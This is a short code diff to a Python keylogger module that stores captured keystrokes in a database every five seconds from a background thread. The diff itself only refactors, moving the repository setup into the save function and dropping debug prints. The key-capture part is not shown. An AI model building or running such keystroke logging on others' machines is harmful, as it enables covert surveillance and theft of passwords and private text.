@@ -4,7 +4,6 @@ import logging
 import time
 import asyncio
 from db.repository.KeyloggerRepository import KeyloggerRepository
-keyloggerRepository = KeyloggerRepository()
 
 keystrokes = ""
 start_time = time.time()
@@ -38,20 +37,16 @@ def save_keystrokes():
     global keystrokes
     global start_time
     print(keystrokes)
+    keyloggerRepository = KeyloggerRepository()
     if keystrokes:
         keyloggerRepository.insert_keylog(start_time=start_time, keys=keystrokes, end_time=time.time())
     keystrokes = ""
     start_time = time.time()
 
-
 def schedule_insertion():
     while True:
         save_keystrokes()
         time.sleep(5)
-print("I m running async function")
-
 
 thread = threading.Thread(target=schedule_insertion)
 thread.start()
-
-print("Ran scheduler insertion")
